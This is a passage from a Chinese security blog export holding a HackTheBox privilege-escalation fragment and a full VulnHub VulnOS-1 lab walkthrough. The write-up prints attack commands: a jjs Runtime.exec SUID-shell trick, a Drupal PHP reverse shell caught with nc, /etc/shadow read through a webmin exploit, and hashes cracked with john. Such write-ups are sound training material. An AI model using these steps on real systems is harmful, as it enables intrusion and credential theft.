class="line">/snap/core/6350/usr/bin/passwd</span><br><span class="line">/snap/core/6350/usr/bin/sudo</span><br><span class="line">/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/6350/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/6350/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/6350/usr/sbin/pppd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/run-mailcap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br></pre></td></tr></table></figure>

<p>参考GTFOBins</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcnVuLW1haWxjYXAv">run-mailcap<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvampzLw==">jjs<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>使用Java的Runtime.Exec()函数生成一个shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ jjs</span><br><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line">jjs&gt; Java.type(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().<span class="built_in">exec</span>(<span class="string">&#x27;cp /bin/sh /tmp/sh&#x27;</span>).waitFor()</span><br><span class="line">0</span><br><span class="line">jjs&gt; Java.type(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().<span class="built_in">exec</span>(<span class="string">&#x27;chmod u+s /tmp/sh&#x27;</span>).waitFor()</span><br><span class="line">0</span><br><span class="line">jjs&gt; </span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ ls</span><br><span class="line">hsperfdata_root     systemd-private-daa6581d1d8b4f4ca498d538b165beb7-apache2.service-TSRSE0</span><br><span class="line">mongodb-27017.sock  systemd-private-daa6581d1d8b4f4ca498d538b165beb7-systemd-resolved.service-VipHFk</span><br><span class="line">sh            systemd-private-daa6581d1d8b4f4ca498d538b165beb7-systemd-timesyncd.service-1Ap17W</span><br><span class="line">$ ./sh -p</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line">8a8ef79a7a2fbb01ea81688424e9ab15</span><br></pre></td></tr></table></figure>

<p>成功的获取了root权限并取得了flag</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb22.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb23.jpg"></p>
</li>
</ul>
<p><font color="red">知识点总结：</font></p>
<ul>
<li>向php请求参数添加[],使用弱比较绕过身份验证</li>
<li>NoSQL注入攻击，$ne注入</li>
<li>MongoDB注入</li>
<li>正则匹配fuzz查询用户名以及密码</li>
<li>编写python fuzz脚本根据302，200返回页面判断参数是否存在</li>
<li>GTFOBins jjs 使用Java的Runtime.Exec()函数生成一个shell</li>
<li>chmod u+s /tmp/sh更改shell权限，并使用-p参数提升为root权限</li>
</ul>
<p><font color="red">Game over</font></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[vulnos-1]</title>
    <url>/2020/04/16/vulnos-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：VulnOS: 1<br>发布日期：2014年3月22日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>VulnOS.vdi-vbox.7z</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS92dWxub3MvVnVsbk9TLnZkaS12Ym94Ljd6">https://download.vulnhub.com/vulnos/VulnOS.vdi-vbox.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS92dWxub3MvVnVsbk9TLnZkaS12Ym94Ljd6LnRvcnJlbnQ=">https://download.vulnhub.com/vulnos/VulnOS.vdi-vbox.7z.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>欢迎使用VulnOS！</p>
<p>这是制定的第一个脆弱目标，因为想回馈社区。为使事情成为可能的社区而努力！！！</p>
<p>目标是root它并找到操作系统内部的所有漏洞！这是一个ubuntu服务器10.04 LTS（已经制成了很多bug！！！）请勿在生产环境中使用此Box！这是一台VM，它是使用Virtualbox 4.3.8制作的-因此采用.vdi格式。</p>
<p>联网 ：<br>此box是使用桥接网络制成的，并使用DHCP获取IP地址（在构建时为192.168.1.66）。因此，最好将攻击操作系统和TARGET BOX共享到192.168.1.1/24的IP范围也许您可以使用m0n0wall进行设置并设置静态IP地址。<br>如果找不到目标的IP地址，请联系blakrat1 AT gmail DOT com。将为您提供root用户和密码以进行登录…。</p>
<p>希望你觉得这个box有用 ！！！</p>
<p>VulnHub独家！</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -sn -v 192.168.56.*</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.124</span><br><span class="line">Host is up (0.00s latency).</span><br><span class="line">MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p- -v -sV 192.168.56.124</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">23/tcp    open  telnet      Linux telnetd</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">53/tcp    open  domain      ISC BIND 9.7.0-P1</span><br><span class="line">80/tcp    open  http        Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">110/tcp   open  pop3        Dovecot pop3d</span><br><span class="line">111/tcp   open  rpcbind     2 (RPC <span class="comment">#100000)</span></span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp   open  imap        Dovecot imapd</span><br><span class="line">389/tcp   open  ldap        OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">512/tcp   open  <span class="built_in">exec</span>        netkit-rsh rexecd</span><br><span class="line">513/tcp   open  login?</span><br><span class="line">514/tcp   open  shell       Netkit rshd</span><br><span class="line">901/tcp   open  http        Samba SWAT administration server</span><br><span class="line">993/tcp   open  ssl/imap    Dovecot imapd</span><br><span class="line">995/tcp   open  ssl/pop3    Dovecot pop3d</span><br><span class="line">2000/tcp  open  sieve       Dovecot timsieved</span><br><span class="line">2049/tcp  open  nfs         2-4 (RPC <span class="comment">#100003)</span></span><br><span class="line">3306/tcp  open  mysql       MySQL 5.1.73-0ubuntu0.10.04.1</span><br><span class="line">3632/tcp  open  tcpwrapped</span><br><span class="line">6667/tcp  open  irc         IRCnet ircd</span><br><span class="line">8070/tcp  open  ucs-isc?</span><br><span class="line">8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">10000/tcp open  http        MiniServ 0.01 (Webmin httpd)</span><br><span class="line">33370/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">56041/tcp open  status      1 (RPC <span class="comment">#100024)</span></span><br><span class="line">56144/tcp open  nlockmgr    1-4 (RPC <span class="comment">#100021)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -T4 -p 3632 -v 192.168.56.124</span></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">3632/tcp open  distccd</span><br></pre></td></tr></table></figure>

<p>在服务上花了足够的时间并尝试利用它们之后，成功利用了端口3632上托管的“distccd”服务。</p>
<p>搜索该服务的漏洞利用程序，发现了Meatsploit漏洞利用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search distccd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                           ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution</span><br></pre></td></tr></table></figure>

<p>设置RHOST IP地址并启动漏洞利用程序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/misc/distcc_exec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 192.168.56.102:3456 </span><br><span class="line">[-] 192.168.56.124:3632 - Exploit failed [disconnected]: Errno::ECONNRESET Connection reset by peer</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>

<p>不知怎么回事，利用不了这个漏洞，可能是漏洞太古老，太久远了，只能尝试其他方法了。</p>
<p>非典型情况-许多端口是开放的。<br>更喜欢从快速验证（例如MySQL默认帐户，NFS等）开始，进行深度渗透测试。<br>试图使用默认凭据（例如root：root，root：toor，root：password，root：mysql）登录MySQL服务器。不幸的是没有成功。还检查了NFS，但没有好消息…</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># rpcinfo -p 192.168.56.124</span></span><br><span class="line">   program vers proto   port  service</span><br><span class="line">    100000    2   tcp    111  portmapper</span><br><span class="line">    100000    2   udp    111  portmapper</span><br><span class="line">    100024    1   udp  60680  status</span><br><span class="line">    100024    1   tcp  40626  status</span><br><span class="line">    100021    1   udp  38218  nlockmgr</span><br><span class="line">    100021    3   udp  38218  nlockmgr</span><br><span class="line">    100021    4   udp  38218  nlockmgr</span><br><span class="line">    100021    1   tcp  44108  nlockmgr</span><br><span class="line">    100021    3   tcp  44108  nlockmgr</span><br><span class="line">    100021    4   tcp  44108  nlockmgr</span><br><span class="line">    100003    2   udp   2049  nfs</span><br><span class="line">    100003    3   udp   2049  nfs</span><br><span class="line">    100003    4   udp   2049  nfs</span><br><span class="line">    100003    2   tcp   2049  nfs</span><br><span class="line">    100003    3   tcp   2049  nfs</span><br><span class="line">    100003    4   tcp   2049  nfs</span><br><span class="line">    100005    1   udp  55441  mountd</span><br><span class="line">    100005    1   tcp  33014  mountd</span><br><span class="line">    100005    2   udp  55441  mountd</span><br><span class="line">    100005    2   tcp  33014  mountd</span><br><span class="line">    100005    3   udp  55441  mountd</span><br><span class="line">    100005    3   tcp  33014  mountd</span><br><span class="line">root@kali:~<span class="comment"># showmount -e 192.168.56.124</span></span><br><span class="line">Export list <span class="keyword">for</span> 192.168.56.124:</span><br></pre></td></tr></table></figure>

<p>尝试使用OpenSSH。进行了大量研究，发现一些专门用于OpenSSH &lt;= 5.3的漏洞利用，但是它不起作用。</p>
<ul>
<li><img src="https://3.bp.blogspot.com/-Pe7E17cUN_Y/V2uK6vvqgnI/AAAAAAAABdY/DJf0tqzFYc0tCl48ZT2SADUWlF6vx5_KwCLcB/s1600/exp.png"></li>
</ul>
<p>好的，现在轮到Web浏览。默认网页如下所示</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub258.jpg"></li>
</ul>
<p>源代码也不包含任何有用的信息。单击被转发到的链接</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub259.jpg"></li>
</ul>
<p>嗯，也没什么有用的东西。应该记住，端口80不仅是一个开放的http端口。运行dirbuster爆破目录试试</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub260.jpg"></li>
</ul>
<p>该目标使用Apache 2.2.14，它存在公共漏洞利用程序（CVE-2010-0425）。Metasploit具有专用于此版本的辅助模块。但是，现在只想在没有其他方法的情况下使用metasploit。</p>
<p>Dirbuster发现该Web应用程序还具有phpmyadmin面板。因此，请尝试使用默认凭据登录，如root/toor。答对了！</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub261.jpg"></li>
</ul>
<p>以root身份成功登录！很好。尝试从/etc/shadow加载数据，但与/etc/passwd相反（可能权限不足）没有成功。</p>
<ul>
<li><img src="https://1.bp.blogspot.com/-RFOIgH37Zno/V2uVUZEaH6I/AAAAAAAABeY/f5ttDoTmHOUaAGrMkpVCkgHRhCVIr_73wCLcB/s1600/passwd.png"></li>
</ul>
<p>有系统用户的完整列表。尝试使用outfile语句创建phpinfo文件，但未成功。</p>
<p>检查一下可以从数据库中检索到什么在Drupal6数据库中，可以找到</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub262.jpg"></li>
</ul>
<p>好！但是必须破解这些hash。在mysql数据库中，可以找到以下凭证</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub263.jpg"></li>
</ul>
<p>非常好，因为拥有与/etc/passwd文件中部分相同的用户名。破解了几个密码，例如drupal6密码drupal6。所以，现在专注于Drupal</p>
<p>浏览器访问下面的url并使用drupal6/drupal6登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.124/drupal6/</span><br></pre></td></tr></table></figure>

<p>现在，必须找到上传PHP后门的地方。在《Administer》中，添加允许扩展的php和phtml。创建了帖子并附加了PHP后门。成功上传phtml后门文件，然后点击它…</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub264.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub265.jpg"></p>
</li>
</ul>
<p>访问shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.124/drupal6/sites/default/files/phpreverseshell2.phtml</span><br></pre></td></tr></table></figure>

<p>然后kali端使用nc监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.124: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.124] 56444</span><br><span class="line">Linux VulnOS 2.6.32-57-generic-pae <span class="comment">#119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux</span></span><br><span class="line"> 05:30:10 up  1:05,  0 users,  load average: 0.03, 0.05, 0.34</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br></pre></td></tr></table></figure>

<p>优秀！获得了有限制的shell！检查了目标操作系统，并找到Ubuntu 10.04。不幸的是，每项攻击都行不通。花了很多时间寻找一些“秘密”文件，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /etc/nagios3/htpasswd.users</span><br><span class="line">nagiosadmin:8A86JOBWoCwnk</span><br></pre></td></tr></table></figure>

<p>将/etc/passwd文件中的用户名作为字典列表，可能会有帮助。尝试使用john破解此密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnos-1<span class="comment"># john pass --wordlist=/root/vulnhub/vulnos-1/wordlist</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (descrypt, traditional crypt(3) [DES 256/256 AVX2])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Warning: Only 44 candidates left, minimum 1024 needed <span class="keyword">for</span> performance.</span><br><span class="line">canuhack         (nagiosadmin)</span><br><span class="line">1g 0:00:00:00 DONE (2020-04-17 03:25) 100.0g/s 4400p/s 4400c/s 4400C/s root..canuhack</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>很遗憾，没有nagiosadmin用户。/etc/passwd中的用户名为hackme，所以也许应该为canuhackme作为用户密码？</p>
<p>使用msf的auxiliary/admin/webmin/file_disclosure模块尝试读取/etc/shadow文件内容</p>
<p>然后将canuhackme添加到字典中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/admin/webmin/file_disclosure):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting   Required  Description</span><br><span class="line">   ----     ---------------   --------  -----------</span><br><span class="line">   DIR      /unauthenticated  yes       Webmin directory path</span><br><span class="line">   Proxies                    no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS   192.168.56.124    yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPATH    /etc/shadow       yes       The file to download</span><br><span class="line">   RPORT    10000             yes       The target port (TCP)</span><br><span class="line">   SSL      <span class="literal">false</span>             no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   VHOST                      no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name      Description</span><br><span class="line">   ----      -----------</span><br><span class="line">   Download  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; run</span><br><span class="line">[*] Running module against 192.168.56.124</span><br><span class="line"></span><br><span class="line">[*] Attempting to retrieve /etc/shadow...</span><br><span class="line">[*] The server returned: 200 Document follows</span><br><span class="line">root:*:16137:0:99999:7:::</span><br><span class="line">daemon:*:16137:0:99999:7:::</span><br><span class="line">bin:*:16137:0:99999:7:::</span><br><span class="line">sys:*:16137:0:99999:7:::</span><br><span class="line">sync:*:16137:0:99999:7:::</span><br><span class="line">games:*:16137:0:99999:7:::</span><br><span class="line">man:*:16137:0:99999:7:::</span><br><span class="line">lp:*:16137:0:99999:7:::</span><br><span class="line">mail:*:16137:0:99999:7:::</span><br><span class="line">news:*:16137:0:99999:7:::</span><br><span class="line">uucp:*:16137:0:99999:7:::</span><br><span class="line">proxy:*:16137:0:99999:7:::</span><br><span class="line">www-data:*:16137:0:99999:7:::</span><br><span class="line">backup:*:16137:0:99999:7:::</span><br><span class="line">list:*:16137:0:99999:7:::</span><br><span class="line">irc:*:16137:0:99999:7:::</span><br><span class="line">gnats:*:16137:0:99999:7:::</span><br><span class="line">nobody:*:16137:0:99999:7:::</span><br><span class="line">libuuid:!:16137:0:99999:7:::</span><br><span class="line">syslog:*:16137:0:99999:7:::</span><br><span class="line">landscape:*:16137:0:99999:7:::</span><br><span class="line">vulnosadmin:<span class="variable">$6</span><span class="variable">$SLXu95CH</span><span class="variable">$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p</span>.xbnSVJFAeg1WO28ljNAPrlXaghLmo/:16137:0:99999:7:::</span><br><span class="line">sysadmin:admin:16137:0:99999:7:::</span><br><span class="line">webmin:webmin:16137:0:99999:7:::</span><br><span class="line">hackme:hackme:16137:0:99999:7:::</span><br><span class="line">sa:password1:16137:0:99999:7:::</span><br><span class="line">stupiduser:stupiduser:16137:0:99999:7:::</span><br><span class="line">messagebus:*:16137:0:99999:7:::</span><br><span class="line">distccd:*:16137:0:99999:7:::</span><br><span class="line">sshd:*:16138:0:99999:7:::</span><br><span class="line">openldap:!:16138:0:99999:7:::</span><br><span class="line">ftp:!:16138:0:99999:7:::</span><br><span class="line">mysql:!:16138:0:99999:7:::</span><br><span class="line">telnetd:*:16138:0:99999:7:::</span><br><span class="line"><span class="built_in">bind</span>:*:16138:0:99999:7:::</span><br><span class="line">postgres:*:16138:0:99999:7:::</span><br><span class="line">postfix:*:16138:0:99999:7:::</span><br><span class="line">dovecot:*:16138:0:99999:7:::</span><br><span class="line">tomcat6:*:16138:0:99999:7:::</span><br><span class="line">statd:*:16138:0:99999:7:::</span><br><span class="line">snmp:*:16138:0:99999:7:::</span><br><span class="line">nagios:!:16140:0:99999:7:::</span><br><span class="line">openerp:*:16140:0:99999:7:::</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>再次使用john加载字典进行破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnos-1<span class="comment"># cat pass2</span></span><br><span class="line">vulnosadmin:<span class="variable">$6</span><span class="variable">$SLXu95CH</span><span class="variable">$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p</span>.xbnSVJFAeg1WO28ljNAPrlXaghLmo/root@kali:~/vulnhub/vulnos-1<span class="comment"># john pass2 --wordlist=/root/vulnhub/vulnos-1/wordlist</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) <span class="variable">$6</span>$ [SHA512 256/256 AVX2 4x])</span><br><span class="line">Cost 1 (iteration count) is 5000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">canuhackme       (vulnosadmin)</span><br><span class="line">1g 0:00:00:00 DONE (2020-04-17 03:52) 50.00g/s 2200p/s 2200c/s 2200C/s root..canuhackme</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>得到ssh登录用户名：vulnosadmin，密码：canuhackme</p>
<h3 id="登录并提权"><a href="#登录并提权" class="headerlink" title="登录并提权"></a>登录并提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh vulnosadmin@192.168.56.124</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">vulnosadmin@192.168.56.124<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux</span></span><br><span class="line"><span class="string">Ubuntu 10.04.4 LTS</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Welcome to Ubuntu!</span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Fri Apr 17 09:55:15 CEST 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.0                Processes:           141</span></span><br><span class="line"><span class="string">  Usage of /:   16.3% of 23.06GB   Users logged in:     0</span></span><br><span class="line"><span class="string">  Memory usage: 38%                IP address for eth0: 192.168.56.124</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Graph this data and manage this system at:</span></span><br><span class="line"><span class="string">    https://landscape.canonical.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">New release &#x27;</span>precise<span class="string">&#x27; available.</span></span><br><span class="line"><span class="string">Run &#x27;</span><span class="keyword">do</span>-release-upgrade<span class="string">&#x27; to upgrade to it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Mar 19 17:31:44 2014 from 192.168.1.3</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOS:~$ id</span></span><br><span class="line"><span class="string">uid=1000(vulnosadmin) gid=1000(vulnosadmin) groepen=4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin),1000(vulnosadmin)</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOS:~$ whoami</span></span><br><span class="line"><span class="string">vulnosadmin</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOS:~$ sudo -l</span></span><br><span class="line"><span class="string">[sudo] password for vulnosadmin: </span></span><br><span class="line"><span class="string">Matching Defaults entries for vulnosadmin on this host:</span></span><br><span class="line"><span class="string">    env_reset</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User vulnosadmin may run the following commands on this host:</span></span><br><span class="line"><span class="string">    (ALL) ALL</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOS:~$ su</span></span><br><span class="line"><span class="string">Wachtwoord: </span></span><br><span class="line"><span class="string">su: Authenticatie fout</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOS:~$ sudo su</span></span><br><span class="line"><span class="string">root@VulnOS:/home/vulnosadmin# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groepen=0(root)</span></span><br><span class="line"><span class="string">root@VulnOS:/home/vulnosadmin# whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string">root@VulnOS:/home/vulnosadmin# cd /root</span></span><br><span class="line"><span class="string">root@VulnOS:~# ls</span></span><br><span class="line"><span class="string">hello.txt</span></span><br><span class="line"><span class="string">root@VulnOS:~# cat hello.txt </span></span><br><span class="line"><span class="string">Hello,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">So you got root... You still need to find the rest of the vulnerabilities inside the OS !</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRY HARDER !!!!!!!</span></span><br></pre></td></tr></table></figure>

<p>成功登录，提权到root然后拿到了flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub266.jpg"></li>
</ul>
<p><font color="red">注意，此靶机的漏洞非常多，在此不一一尝试了，有兴趣自己去尝试，有新的方法可以联系我QQ:1185151867。</font></p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>msf exploit/unix/misc/distcc_exec 模块利用distcc漏洞getshell</li>
<li>phpmyadmin弱口令</li>
<li>Drupal修改配置项上传phtml shell</li>
<li>john加载/etc/passwd用户名字典破解hash密码</li>
<li>msf auxiliary/admin/webmin/file_disclosure模块读取/etc/shadow文件内容</li>
<li>sudo su 然后输入密码提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>欢迎来到lucifer11的博客</title>
    <url>/2018/12/06/welcome-to-lucifer11&#39;s-blog/</url>
